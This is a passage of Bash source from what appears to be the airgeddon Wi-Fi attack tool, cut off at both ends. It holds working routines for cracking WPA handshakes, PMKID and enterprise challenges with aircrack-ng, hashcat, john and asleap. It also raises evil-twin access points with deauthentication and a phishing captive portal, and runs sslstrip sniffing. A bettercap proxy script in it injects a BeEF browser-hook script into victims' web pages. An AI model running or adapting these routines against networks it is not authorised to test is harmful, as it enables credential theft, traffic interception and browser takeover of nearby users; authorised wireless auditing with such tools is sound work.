	language_strings "${language}" 308
	language_strings "${language}" 320
	language_strings "${language}" 482
	language_strings "${language}" 58
	language_strings "${language}" 331
	language_strings "${language}" 519
	language_strings "${language}" 687
	language_strings "${language}" 717
	print_hint ${current_menu}

	read -rp "> " captive_portal_language_selected
	echo
	case ${captive_portal_language_selected} in
		0)
			return_to_et_main_menu=1
			return 1
		;;
		1)
			captive_portal_language="ENGLISH"
		;;
		2)
			captive_portal_language="SPANISH"
		;;
		3)
			captive_portal_language="FRENCH"
		;;
		4)
			captive_portal_language="CATALAN"
		;;
		5)
			captive_portal_language="PORTUGUESE"
		;;
		6)
			captive_portal_language="RUSSIAN"
		;;
		7)
			captive_portal_language="GREEK"
		;;
		8)
			captive_portal_language="ITALIAN"
		;;
		9)
			captive_portal_language="POLISH"
		;;
		10)
			captive_portal_language="GERMAN"
		;;
		11)
			captive_portal_language="TURKISH"
		;;
		12)
			captive_portal_language="ARABIC"
		;;
		13)
			captive_portal_language="CHINESE"
		;;
		*)
			invalid_captive_portal_language_selected
		;;
	esac

	return 0
}

#Read and validate the minlength var
function set_minlength() {

	debug_print

	local regexp
	if [[ "${1}" = "personal_handshake" ]] || [[ "${1}" = "personal_pmkid" ]]; then
		regexp="^[8-9]$|^[1-5][0-9]$|^6[0-3]$"
		minlength_text=8
	else
		regexp="^[1-9]$|^[1-5][0-9]$|^6[0-3]$"
		minlength_text=1
	fi

	minlength=0
	while [[ ! ${minlength} =~ ${regexp} ]]; do
		echo
		language_strings "${language}" 194 "green"
		read -rp "> " minlength
	done
}

#Read and validate the maxlength var
function set_maxlength() {

	debug_print

	local regexp
	if [[ "${1}" = "personal_handshake" ]] || [[ "${1}" = "personal_pmkid" ]]; then
		regexp="^[8-9]$|^[1-5][0-9]$|^6[0-3]$"
	else
		regexp="^[1-9]$|^[1-5][0-9]$|^6[0-3]$"
	fi

	maxlength=0
	while [[ ! ${maxlength} =~ ${regexp} ]]; do
		echo
		language_strings "${language}" 195 "green"
		read -rp "> " maxlength
	done
}

#Manage the minlength and maxlength vars on bruteforce attacks
function set_minlength_and_maxlength() {

	debug_print

	set_minlength "${1}"
	maxlength=0
	while [[ "${maxlength}" -lt "${minlength}" ]]; do
		set_maxlength "${1}"
	done
}

#Charset selection menu
function set_charset() {

	debug_print

	clear
	language_strings "${language}" 238 "title"
	language_strings "${language}" 196 "green"
	print_simple_separator
	language_strings "${language}" 197
	language_strings "${language}" 198
	language_strings "${language}" 199
	language_strings "${language}" 200
	language_strings "${language}" 201
	language_strings "${language}" 202
	language_strings "${language}" 203
	language_strings "${language}" 204
	language_strings "${language}" 205
	language_strings "${language}" 206
	language_strings "${language}" 207
	print_hint ${current_menu}

	read -rp "> " charset_option
	case ${1} in
		"aircrack"|"jtr")
			case ${charset_option} in
				1)
					charset=${crunch_lowercasecharset}
				;;
				2)
					charset=${crunch_uppercasecharset}
				;;
				3)
					charset=${crunch_numbercharset}
				;;
				4)
					charset=${crunch_symbolcharset}
				;;
				5)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}"
				;;
				6)
					charset="${crunch_lowercasecharset}${crunch_numbercharset}"
				;;
				7)
					charset="${crunch_uppercasecharset}${crunch_numbercharset}"
				;;
				8)
					charset="${crunch_symbolcharset}${crunch_numbercharset}"
				;;
				9)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}${crunch_numbercharset}"
				;;
				10)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}${crunch_symbolcharset}"
				;;
				11)
					charset="${crunch_lowercasecharset}${crunch_uppercasecharset}${crunch_numbercharset}${crunch_symbolcharset}"
				;;
			esac
		;;
		"hashcat")
			case ${charset_option} in
				1)
					charset="?l"
				;;
				2)
					charset="?u"
				;;
				3)
					charset="?d"
				;;
				4)
					charset="?s"
				;;
				5)
					charset="-1 ?l?u"
				;;
				6)
					charset="-1 ?l?d"
				;;
				7)
					charset="-1 ?u?d"
				;;
				8)
					charset="-1 ?s?d"
				;;
				9)
					charset="-1 ?l?u?d"
				;;
				10)
					charset="-1 ?l?u?s"
				;;
				11)
					charset="?a"
				;;
			esac

			if [[ ${charset} =~ ^\-1 ]]; then
				charset_tmp=""
				for ((i=0; i < maxlength; i++)); do
					charset_tmp+="?1"
				done
				charset="\"${charset}\" \"${charset_tmp}\""
			else
				charset_tmp="${charset}"
				for ((i=0; i < maxlength - 1; i++)); do
					charset+="${charset_tmp}"
				done
			fi
		;;
	esac

	set_show_charset "${1}"
}

#Set a var to show the chosen charset
function set_show_charset() {

	debug_print

	showcharset=""

	case ${1} in
		"aircrack"|"jtr")
			showcharset="${charset}"
		;;
		"hashcat")
			case ${charset_tmp} in
				"?a")
					for item in "${hashcat_charsets[@]}"; do
						if [ "${hashcat_charset_fix_needed}" -eq 0 ]; then
							showcharset+=$(hashcat --help | grep "${item} =" | awk '{print $3}')
						else
							showcharset+=$(hashcat --help | grep -E "^  ${item#'?'} \|" | awk '{print $3}')
						fi
					done
				;;
				*)
					if [[ ${charset} =~ ^\"\-1[[:blank:]]((\?[luds])+).* ]]; then
						showcharset="${BASH_REMATCH[1]}"
						IFS='?' read -ra charset_masks <<< "${showcharset}"
						showcharset=""
						for item in "${charset_masks[@]}"; do
							if [ -n "${item}" ]; then
								if [ "${hashcat_charset_fix_needed}" -eq 0 ]; then
									showcharset+=$(hashcat --help | grep "${item} =" | awk '{print $3}')
								else
									showcharset+=$(hashcat --help | grep -E "^  ${item} \|" | awk '{print $3}')
								fi
							fi
						done
					else
						if [ "${hashcat_charset_fix_needed}" -eq 0 ]; then
							showcharset=$(hashcat --help | grep "${charset_tmp} =" | awk '{print $3}')
						else
							showcharset=$(hashcat --help | grep -E "^  ${charset_tmp#'?'} \|" | awk '{print $3}')
						fi
					fi
				;;
			esac
		;;
	esac
}

#Execute aircrack+crunch bruteforce attack
function exec_aircrack_bruteforce_attack() {

	debug_print
	rm -rf "${tmpdir}${aircrack_pot_tmp}" > /dev/null 2>&1
	aircrack_cmd="crunch \"${minlength}\" \"${maxlength}\" \"${charset}\" | aircrack-ng -a 2 -b \"${bssid}\" -l \"${tmpdir}${aircrack_pot_tmp}\" -w - \"${enteredpath}\" ${colorize}"
	eval "${aircrack_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute aircrack dictionary attack
function exec_aircrack_dictionary_attack() {

	debug_print

	rm -rf "${tmpdir}${aircrack_pot_tmp}" > /dev/null 2>&1
	aircrack_cmd="aircrack-ng -a 2 -b \"${bssid}\" -l \"${tmpdir}${aircrack_pot_tmp}\" -w \"${DICTIONARY}\" \"${enteredpath}\" ${colorize}"
	eval "${aircrack_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute john the ripper dictionary attack
function exec_jtr_dictionary_attack() {

	debug_print

	rm -rf "${tmpdir}jtrtmp"* > /dev/null 2>&1

	jtr_cmd="john \"${jtrenterpriseenteredpath}\" --format=netntlm-naive --wordlist=\"${DICTIONARY}\" --pot=\"${tmpdir}${jtr_pot_tmp}\" --encoding=UTF-8 | tee \"${tmpdir}${jtr_output_file}\" ${colorize}"
	eval "${jtr_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute john the ripper bruteforce attack
function exec_jtr_bruteforce_attack() {

	debug_print

	rm -rf "${tmpdir}jtrtmp"* > /dev/null 2>&1

	jtr_cmd="crunch \"${minlength}\" \"${maxlength}\" \"${charset}\" | john \"${jtrenterpriseenteredpath}\" --stdin --format=netntlm-naive --pot=\"${tmpdir}${jtr_pot_tmp}\" --encoding=UTF-8 | tee \"${tmpdir}${jtr_output_file}\" ${colorize}"
	eval "${jtr_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute hashcat dictionary attack
function exec_hashcat_dictionary_attack() {

	debug_print

	if [ "${1}" = "personal_handshake" ]; then
		hashcat_cmd="hashcat -m ${hashcat_handshake_cracking_plugin} -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	elif [ "${1}" = "personal_pmkid" ]; then
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		hashcat_cmd="hashcat -m ${hashcat_pmkid_cracking_plugin} -a 0 \"${hashcatpmkidenteredpath}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	else
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		hashcat_cmd="hashcat -m ${hashcat_enterprise_cracking_plugin} -a 0 \"${hashcatenterpriseenteredpath}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	fi
	eval "${hashcat_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute hashcat bruteforce attack
function exec_hashcat_bruteforce_attack() {

	debug_print

	if [ "${1}" = "personal_handshake" ]; then
		hashcat_cmd="hashcat -m ${hashcat_handshake_cracking_plugin} -a 3 \"${tmpdir}${hashcat_tmp_file}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	elif [ "${1}" = "personal_pmkid" ]; then
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		hashcat_cmd="hashcat -m ${hashcat_pmkid_cracking_plugin} -a 3 \"${hashcatpmkidenteredpath}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	else
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		hashcat_cmd="hashcat -m ${hashcat_enterprise_cracking_plugin} -a 3 \"${hashcatenterpriseenteredpath}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	fi
	eval "${hashcat_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute hashcat rule based attack
function exec_hashcat_rulebased_attack() {

	debug_print

	if [ "${1}" = "personal_handshake" ]; then
		hashcat_cmd="hashcat -m ${hashcat_handshake_cracking_plugin} -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	elif [ "${1}" = "personal_pmkid" ]; then
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		hashcat_cmd="hashcat -m ${hashcat_pmkid_cracking_plugin} -a 0 \"${hashcatpmkidenteredpath}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	else
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		hashcat_cmd="hashcat -m ${hashcat_enterprise_cracking_plugin} -a 0 \"${hashcatenterpriseenteredpath}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	fi
	eval "${hashcat_cmd}"
	language_strings "${language}" 115 "read"
}

#Execute Enterprise smooth/noisy attack
function exec_enterprise_attack() {

	debug_print

	rm -rf "${tmpdir}${control_enterprise_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
	mkdir "${tmpdir}${enterprisedir}" > /dev/null 2>&1

	set_hostapd_wpe_config
	launch_fake_ap
	exec_et_deauth
	set_enterprise_control_script
	launch_enterprise_control_window
	write_et_processes

	echo
	language_strings "${language}" 524 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi

	if [ "${enterprise_mode}" = "noisy" ]; then
		restore_et_interface
	else
		if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then
			if [ -f "${tmpdir}${enterprisedir}returning_vars.txt" ]; then

				local tmp_interface
				tmp_interface=$(grep -E "^interface=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
				if [ -n "${tmp_interface}" ]; then
					interface="${tmp_interface}"
				fi

				local tmp_phy_interface
				tmp_phy_interface=$(grep -E "^phy_interface=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
				if [ -n "${tmp_phy_interface}" ]; then
					phy_interface="${tmp_phy_interface}"
				fi

				local tmp_current_iface_on_messages
				tmp_current_iface_on_messages=$(grep -E "^current_iface_on_messages=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
				if [ -n "${tmp_current_iface_on_messages}" ]; then
					current_iface_on_messages="${tmp_current_iface_on_messages}"
				fi

				local tmp_ifacemode
				tmp_ifacemode=$(grep -E "^ifacemode=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
				if [ -n "${tmp_ifacemode}" ]; then
					ifacemode="${tmp_ifacemode}"
				fi

				rm -rf "${tmpdir}${enterprisedir}returning_vars.txt" > /dev/null 2>&1
			fi
		else
			restore_et_interface
		fi
	fi
	handle_enterprise_log
	handle_asleap_attack
	clean_tmpfiles
}

#Manage and handle asleap attack integrated on Evil Twin and Enterprise
function handle_asleap_attack() {

	debug_print

	if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then
		local result
		result=$(cat "${tmpdir}${enterprisedir}${enterprise_successfile}")
		if [[ "${result}" -eq 0 ]] || [[ "${result}" -eq 2 ]]; then
			ask_yesno 537 "no"
			if [ "${yesno}" = "y" ]; then

				asleap_attack_finished=0

				if [ "${enterprise_mode}" = "noisy" ]; then
					if [ ${#enterprise_captured_challenges_responses[@]} -eq 1 ]; then
						for item in "${!enterprise_captured_challenges_responses[@]}"; do
							enterprise_username="${item}"
						done

						echo
						language_strings "${language}" 542 "yellow"
					else
						select_captured_enterprise_user
					fi
				fi

				echo
				language_strings "${language}" 538 "blue"

				while [[ "${asleap_attack_finished}" != "1" ]]; do
					ask_dictionary
					echo
					exec_asleap_attack
					echo
					manage_asleap_pot
				done
			fi
		fi
	fi
}

#Menu for captured enterprise user selection
function select_captured_enterprise_user() {

	debug_print

	echo
	language_strings "${language}" 47 "green"
	print_simple_separator

	local counter=0
	local space="  "
	declare -A temp_array_enterpise_users
	for item in "${!enterprise_captured_challenges_responses[@]}"; do
		if [ "${counter}" -gt 9 ]; then
			space=" "
		fi
		counter=$((counter + 1))
		echo "${counter}.${space}${item}"
		temp_array_enterpise_users[${counter}]="${item}"
	done
	print_simple_separator

	option_enterprise_user_selected=""
	while [[ -z "${option_enterprise_user_selected}" ]]; do
		read -rp "> " option_enterprise_user_selected
		if [[ ! "${option_enterprise_user_selected}" =~ ^[0-9]+$ ]] || [[ "${option_enterprise_user_selected}" -lt 1 ]] || [[ "${option_enterprise_user_selected}" -gt ${counter} ]]; then
			option_enterprise_user_selected=""
			echo
			language_strings "${language}" 543 "red"
		fi
	done

	enterprise_username="${temp_array_enterpise_users[${option_enterprise_user_selected}]}"
}

#Execute asleap attack
function exec_asleap_attack() {

	debug_print

	rm -rf "${tmpdir}${asleap_pot_tmp}" > /dev/null 2>&1

	if [ "${1}" != "offline_menu" ]; then
		[[ "${enterprise_captured_challenges_responses[${enterprise_username}]}" =~ (([0-9a-zA-Z]{2}:?)+)[[:blank:]]/[[:blank:]](.*) ]] && enterprise_asleap_challenge="${BASH_REMATCH[1]}" && enterprise_asleap_response="${BASH_REMATCH[3]}"
	fi
	asleap_cmd="asleap -C \"${enterprise_asleap_challenge}\" -R \"${enterprise_asleap_response}\" -W \"${DICTIONARY}\" -v | tee \"${tmpdir}${asleap_pot_tmp}\" ${colorize}"
	eval "${asleap_cmd}"
}

#Execute Evil Twin only Access Point attack
function exec_et_onlyap_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_network_interface_data
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	set_et_control_script
	launch_et_control_window
	write_et_processes

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi

	restore_et_interface
	clean_tmpfiles
}

#Execute Evil Twin with sniffing attack
function exec_et_sniffing_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_network_interface_data
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	launch_ettercap_sniffing
	set_et_control_script
	launch_et_control_window
	write_et_processes

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi

	restore_et_interface
	if [ "${ettercap_log}" -eq 1 ]; then
		parse_ettercap_log
	fi
	clean_tmpfiles
}

#Execute Evil Twin with sniffing+bettercap-sslstrip2 attack
function exec_et_sniffing_sslstrip2_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_network_interface_data
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	launch_bettercap_sniffing
	set_et_control_script
	launch_et_control_window
	write_et_processes

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi

	restore_et_interface
	if [ "${bettercap_log}" -eq 1 ]; then
		parse_bettercap_log
	fi
	clean_tmpfiles
}

#Execute Evil Twin with sniffing+bettercap-sslstrip2/beef attack
function exec_et_sniffing_sslstrip2_beef_attack() {

	debug_print

	set_hostapd_config
	launch_fake_ap
	set_network_interface_data
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	if [ "${beef_found}" -eq 1 ]; then
		get_beef_version
		set_beef_config
	else
		new_beef_pass="beef"
		et_misc_texts[${language},27]=${et_misc_texts[${language},27]/${beef_pass}/${new_beef_pass}}
		beef_pass="${new_beef_pass}"

	fi
	launch_beef
	launch_bettercap_sniffing
	set_et_control_script
	launch_et_control_window
	write_et_processes

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi

	restore_et_interface
	if [ "${bettercap_log}" -eq 1 ]; then
		parse_bettercap_log
	fi
	clean_tmpfiles
}

#Execute captive portal Evil Twin attack
function exec_et_captive_portal_attack() {

	debug_print

	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
	mkdir "${tmpdir}${webdir}" > /dev/null 2>&1

	set_hostapd_config
	launch_fake_ap
	set_network_interface_data
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	set_et_control_script
	launch_et_control_window
	launch_dns_blackhole
	set_webserver_config
	set_captive_portal_page
	launch_webserver
	write_et_processes

	echo
	language_strings "${language}" 298 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi

	restore_et_interface
	clean_tmpfiles
}

#Create configuration files for bettercap
function set_bettercap_config() {

	debug_print

	rm -rf "${tmpdir}${bettercap_config_file}" > /dev/null 2>&1

	if [ "${et_mode}" = "et_sniffing_sslstrip2_beef" ]; then

		rm -rf "${tmpdir}${bettercap_hook_file}" > /dev/null 2>&1

		{
		echo -e "set http.proxy.script ${bettercap_hook_file}"
		} >> "${tmpdir}${bettercap_config_file}"

		{
		echo -e "function onLoad() {"
		echo -e "\tlog('BeefInject loaded.');"
		echo -e "\tlog('targets: ' + env['arp.spoof.targets']);"
		echo -e "}\n"
		echo -e "function onResponse(req, res) {"
		echo -e "\tif (res.ContentType.indexOf('text/html') == 0) {"
		echo -e "\t\tvar body = res.ReadBody();"
		echo -e "\t\tif (body.indexOf('</head>') != -1) {"
		echo -e "\t\t\tres.Body = body.replace('</head>', '<script type=\"text/javascript\" src=\"http://${et_ip_router}:${beef_port}/${jshookfile}\"></script></head>');"
		echo -e "\t\t}"
		echo -e "\t}"
		echo -e "}"
		} >> "${tmpdir}${bettercap_hook_file}"
	fi

	{
	echo -e "set http.proxy.port ${bettercap_proxy_port}"
	echo -e "set http.proxy.sslstrip true"
	echo -e "http.proxy on\n"
	echo -e "set net.sniff.verbose true"
	echo -e "net.recon on"
	echo -e "net.sniff on\n"
	echo -e "events.stream off"
	echo -e "set events.stream.http.request.dump true\n"
	echo -e "events.ignore net.sniff.http.response"
	echo -e "events.ignore http.proxy.spoofed-response"
	echo -e "events.ignore net.sniff.dns"
	echo -e "events.ignore net.sniff.tcp"
	echo -e "events.ignore net.sniff.udp"
	echo -e "events.ignore net.sniff.mdns"
	echo -e "events.ignore net.sniff.sni"
	echo -e "events.ignore net.sniff.https\n"
	echo -e "events.stream on"
	} >> "${tmpdir}${bettercap_config_file}"
}

#Create configuration file for hostapd
function set_hostapd_config() {

	debug_print

	rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1

	local digit_to_change
	digit_to_change="${bssid:10:1}"
	((different_mac_digit=("16#${digit_to_change}" + 1 + RANDOM % 15) % 16))
	et_bssid=$(printf %s%X%s\\n "${bssid::10}" "${different_mac_digit}" "${bssid:11}")

	{
	echo -e "interface=${interface}"
	echo -e "driver=nl80211"
	echo -e "ssid=${essid}"
	echo -e "bssid=${et_bssid}"
	echo -e "channel=${channel}"
	} >> "${tmpdir}${hostapd_file}"

	if [ "${channel}" -gt 14 ]; then
		{
		echo -e "hw_mode=a"
		} >> "${tmpdir}${hostapd_file}"
	else
		{
		echo -e "hw_mode=g"
		} >> "${tmpdir}${hostapd_file}"
	fi

	if [ "${country_code}" != "00" ]; then
		{
		echo -e "country_code=${country_code}"
		} >> "${tmpdir}${hostapd_file}"
	fi
}

#Create configuration file for hostapd
function set_hostapd_wpe_config() {

	debug_print

	rm -rf "${tmpdir}${hostapd_wpe_file}" > /dev/null 2>&1

	different_mac_digit=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 | head -n 100 | grep -v "${bssid:10:1}" | head -c 1)
	et_bssid=${bssid::10}${different_mac_digit}${bssid:11:6}

	{
	echo -e "interface=${interface}"
	echo -e "driver=nl80211"
	echo -e "ssid=${essid}"
	echo -e "bssid=${et_bssid}"
	echo -e "channel=${channel}"
	echo -e "eap_server=1"
	echo -e "eap_fast_a_id=101112131415161718191a1b1c1d1e1f"
	echo -e "eap_fast_a_id_info=hostapd-wpe"
	echo -e "eap_fast_prov=3"
	echo -e "ieee8021x=1"
	echo -e "pac_key_lifetime=604800"
	echo -e "pac_key_refresh_time=86400"
	echo -e "pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f"
	echo -e "wpa=2"
	echo -e "wpa_key_mgmt=WPA-EAP"
	echo -e "wpa_pairwise=CCMP"
	echo -e "rsn_pairwise=CCMP"
	echo -e "eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user"
	} >> "${tmpdir}${hostapd_wpe_file}"

	{
	echo -e "ca_cert=${hostapd_wpe_cert_path}ca.pem"
	echo -e "server_cert=${hostapd_wpe_cert_path}server.pem"
	echo -e "private_key=${hostapd_wpe_cert_path}server.key"
	echo -e "private_key_passwd=${hostapd_wpe_cert_pass}"
	} >> "${tmpdir}${hostapd_wpe_file}"

	if [ "${channel}" -gt 14 ]; then
		{
		echo -e "hw_mode=a"
		} >> "${tmpdir}${hostapd_wpe_file}"
	else
		{
		echo -e "hw_mode=g"
		} >> "${tmpdir}${hostapd_wpe_file}"
	fi

	if [ "${country_code}" != "00" ]; then
		{
		echo -e "country_code=${country_code}"
		} >> "${tmpdir}${hostapd_wpe_file}"
	fi
}

#Launch hostapd and hostapd-wpe fake Access Point
function launch_fake_ap() {

	debug_print

	if "${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"; then
		${airmon} check kill > /dev/null 2>&1
		nm_processes_killed=1
	else
		if [ "${check_kill_needed}" -eq 1 ]; then
			${airmon} check kill > /dev/null 2>&1
			nm_processes_killed=1
		fi
	fi

	if [ "${mac_spoofing_desired}" -eq 1 ]; then
		set_spoofed_mac "${interface}"
	fi

	recalculate_windows_sizes
	local command
	local log_command

	if [ -n "${enterprise_mode}" ]; then
		rm -rf "${tmpdir}${hostapd_wpe_log}" > /dev/null 2>&1
		rm -rf "${scriptfolder}${hostapd_wpe_default_log}" > /dev/null 2>&1
		command="hostapd-wpe \"${tmpdir}${hostapd_wpe_file}\""
		log_command=" | tee ${tmpdir}${hostapd_wpe_log}"
		hostapd_scr_window_position=${g1_topleft_window}
	else
		command="hostapd \"${tmpdir}${hostapd_file}\""
		log_command=""
		case ${et_mode} in
			"et_onlyap")
				hostapd_scr_window_position=${g1_topleft_window}
			;;
			"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
				hostapd_scr_window_position=${g3_topleft_window}
			;;
			"et_sniffing_sslstrip2")
				hostapd_scr_window_position=${g4_topleft_window}
			;;
		esac
	fi

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
	fi

	manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${hostapd_scr_window_position} -T \"AP\"" "${command}${log_command}" "AP"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
		if [ "${dos_pursuit_mode}" -eq 1 ]; then
			dos_pursuit_mode_ap_pid=$!
			dos_pursuit_mode_pids+=("${dos_pursuit_mode_ap_pid}")
		fi
	else
		get_tmux_process_id "${command}"
		et_processes+=("${global_process_pid}")
		if [ "${dos_pursuit_mode}" -eq 1 ]; then
			dos_pursuit_mode_pids+=("${global_process_pid}")
		fi
		global_process_pid=""
	fi

	sleep 3
}

#Set network data parameters
function set_network_interface_data() {

	debug_print

	std_c_mask="255.255.255.0"
	ip_mask="255.255.255.255"
	std_c_mask_cidr="24"
	ip_mask_cidr="32"
	any_mask_cidr="0"
	any_ip="0.0.0.0"
	any_ipv6="::/0"

	first_octet="192"
	second_octet="169"
	third_octet="1"
	fourth_octet="0"

	ip_range="${first_octet}.${second_octet}.${third_octet}.${fourth_octet}"

	if ip route | grep ${ip_range} > /dev/null; then
		while true; do
			third_octet=$((third_octet + 1))
			ip_range="${first_octet}.${second_octet}.${third_octet}.${fourth_octet}"
			if ! ip route | grep ${ip_range} > /dev/null; then
				break
			fi
		done
	fi

	et_ip_range="${ip_range}"
	et_ip_router="${first_octet}.${second_octet}.${third_octet}.1"
	et_broadcast_ip="${first_octet}.${second_octet}.${third_octet}.255"
	et_range_start="${first_octet}.${second_octet}.${third_octet}.33"
	et_range_stop="${first_octet}.${second_octet}.${third_octet}.100"
}

#Create configuration file for dhcpd
function set_dhcp_config() {

	debug_print

	rm -rf "${tmpdir}${dhcpd_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}clts.txt" > /dev/null 2>&1
	ip link set "${interface}" up > /dev/null 2>&1

	{
	echo -e "authoritative;"
	echo -e "default-lease-time 600;"
	echo -e "max-lease-time 7200;"
	echo -e "subnet ${et_ip_range} netmask ${std_c_mask} {"
	echo -e "\toption broadcast-address ${et_broadcast_ip};"
	echo -e "\toption routers ${et_ip_router};"
	echo -e "\toption subnet-mask ${std_c_mask};"
	} >> "${tmpdir}${dhcpd_file}"

	if [ "${et_mode}" != "et_captive_portal" ]; then
		echo -e "\toption domain-name-servers ${internet_dns1}, ${internet_dns2};" >> "${tmpdir}${dhcpd_file}"
	else
		echo -e "\toption domain-name-servers ${et_ip_router};" >> "${tmpdir}${dhcpd_file}"
	fi

	{
	echo -e "\trange ${et_range_start} ${et_range_stop};"
	echo -e "}"
	} >> "${tmpdir}${dhcpd_file}"

	leases_found=0
	for item in "${!possible_dhcp_leases_files[@]}"; do
		if [ -f "${possible_dhcp_leases_files[${item}]}" ]; then
			leases_found=1
			key_leases_found=${item}
			break
		fi
	done

	if [ "${leases_found}" -eq 1 ]; then
		echo -e "lease-file-name \"${possible_dhcp_leases_files[${key_leases_found}]}\";" >> "${tmpdir}${dhcpd_file}"
		chmod a+w "${possible_dhcp_leases_files[${key_leases_found}]}" > /dev/null 2>&1
	else
		touch "${possible_dhcp_leases_files[0]}" > /dev/null 2>&1
		echo -e "lease-file-name \"${possible_dhcp_leases_files[0]}\";" >> "${tmpdir}${dhcpd_file}"
		chmod a+w "${possible_dhcp_leases_files[0]}" > /dev/null 2>&1
	fi

	dhcp_path="${tmpdir}${dhcpd_file}"
	if hash apparmor_status 2> /dev/null; then
		if apparmor_status 2> /dev/null | grep dhcpd > /dev/null; then
			if [ -d /etc/dhcpd ]; then
				cp "${tmpdir}${dhcpd_file}" /etc/dhcpd/ 2> /dev/null
				dhcp_path="/etc/dhcpd/${dhcpd_file}"
			elif [ -d /etc/dhcp ]; then
				cp "${tmpdir}${dhcpd_file}" /etc/dhcp/ 2> /dev/null
				dhcp_path="/etc/dhcp/${dhcpd_file}"
			else
				cp "${tmpdir}${dhcpd_file}" /etc/ 2> /dev/null
